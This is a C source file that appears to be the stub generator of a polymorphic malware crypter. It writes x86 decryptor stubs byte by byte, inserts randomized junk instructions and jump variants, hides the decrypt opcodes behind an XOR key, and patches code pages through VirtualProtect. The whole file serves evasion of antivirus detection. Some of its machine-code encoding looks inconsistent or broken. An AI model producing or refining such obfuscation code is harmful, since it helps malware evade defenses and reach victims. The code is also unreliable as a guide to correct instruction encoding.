#include "stub.h"
#include <stdlib.h>

void garbage1() { __asm__("nop\n\tmov eax, eax\n\tadd ebx, 0"); }
void garbage2() { __asm__("xor ecx, ecx\n\tinc edx"); }
void garbage3() { __asm__("sub eax, eax\n\tor ebx, ebx"); }
void garbage4() { __asm__("lea eax, [eax+eax]\n\txor ebx, ecx"); }
void garbage5() { __asm__("imul edx, ebx, 3\n\tadd eax, edx"); }

void insert_garbage_blocks() {
    switch(rand() % 6) {
        case 0: garbage1(); break;
        case 1: garbage2(); break;
        case 2: garbage3(); break;
        case 3: garbage4(); break;
        case 4: garbage5(); break;
        case 5: garbage1(); garbage2(); break;
    }
}

void insert_garbage(unsigned char **stub, int count) {
    const uint8_t garbage[] = { 0x90, 0x27, 0x37, 0x2E, 0x3E, 0x9B, 0xF8, 0xFC, 0xAA, 0xBB, 0xCC };
    for (int i = 0; i < count; i++) {
        if (rand() % 3 == 0)
            *(*stub)++ = garbage[rand() % (sizeof(garbage) / sizeof(garbage[0]))];
        else {
            switch(rand() % 6) {
                case 0: *(*stub)++ = 0x40 + (rand() % 0x3F); break;
                case 1: *(*stub)++ = 0x66; *(*stub)++ = 0x90; i++; break;
                case 2: *(*stub)++ = 0x0F; *(*stub)++ = 0x1F + (rand() % 4); i++; break;
                case 3: *(*stub)++ = 0x90 ^ (rand() % 0x100); break;
                case 4: *(*stub)++ = 0x90; *(*stub)++ = 0x90; i++; break;
                case 5: *(*stub)++ = 0xD3; *(*stub)++ = 0xC0 | (rand() % 8); i++; break;
            }
        }
    }
}

void self_modifying_wrapper(int (*func)()) {
    void *page = (void *)((uintptr_t)func & ~(uintptr_t)0xFFF);
    size_t len = 4096;
    DWORD old_protect;
    VirtualProtect(page, len, PAGE_EXECUTE_READWRITE, &old_protect);
    unsigned char *p = (unsigned char *)func;
    for (int i = 0; i < 4; i++)
        p[i] = (rand() % 2) ? 0x90 : 0xCC;
    VirtualProtect(page, len, PAGE_EXECUTE_READ, &old_protect);
}

void generate_stub(unsigned char *stub, size_t *size, EncMethod method, int payload_size) {
    unsigned char *p = stub;
    int addr_reg = rand() % 8;
    int use_jmp = rand() % 3;
    int code_variant = rand() % 3;
    MethodConfig config = {0};
    for (int i = 0; i < 4; i++) {
        if (ENCRYPTED_METHODS[i].method == method) {
            config.decrypt_opcode = ENCRYPTED_METHODS[i].decrypt_opcode ^ XOR_KEY;
            config.stub_register_mask = ENCRYPTED_METHODS[i].stub_register_mask ^ XOR_KEY;
            break;
        }
    }
    if (code_variant == 0) {
        insert_garbage(&p, rand() % 8);
        *p++ = 0xB8 | (addr_reg & 0x7);
        *((uint64_t*)p) = (uint64_t)(p + 8 + rand() % 16);
        p += 8;
    } else if (code_variant == 1) {
        *p++ = 0xE8;
        *((int*)p) = rand() % 256;
        p += 4;
        insert_garbage(&p, rand() % 4);
    } else {
        *p++ = 0xEB;
        *p++ = rand() % 256;
        insert_garbage(&p, rand() % 4);
    }
    *p++ = 0xC6 + (rand() % 2);
    *p++ = (rand() % 4) << 6;
    *p++ = 0x90 ^ (rand() % 0x100);
    insert_garbage(&p, 2 + rand() % 6);
    if (use_jmp == 0) {
        *p++ = 0xE2 + (rand() % 4);
        *p++ = 0xF6 + (rand() % 8);
    } else if (use_jmp == 1) {
        *p++ = 0x75;
        *p++ = 0xEE + (rand() % 8);
    } else {
        *p++ = 0xEB;
        *p++ = rand() % 256;
    }
    uint8_t base_reg = (rand() % 4) << 3;
    *p++ = config.decrypt_opcode;
    *p++ = config.stub_register_mask | base_reg | (rand() % 2);
    if (rand() % 2) {
        *p++ = 0x83;
        *p++ = 0xC0 | (addr_reg << 3);
        *p++ = 0x02 + (rand() % 4);
    } else {
        *p++ = 0x05 + (rand() % 2);
        *((int*)p) = 2;
        p += 4;
    }
    insert_garbage(&p, rand() % 4);
    insert_garbage(&p, 2 + rand() % 8);
    *size = p - stub;
}
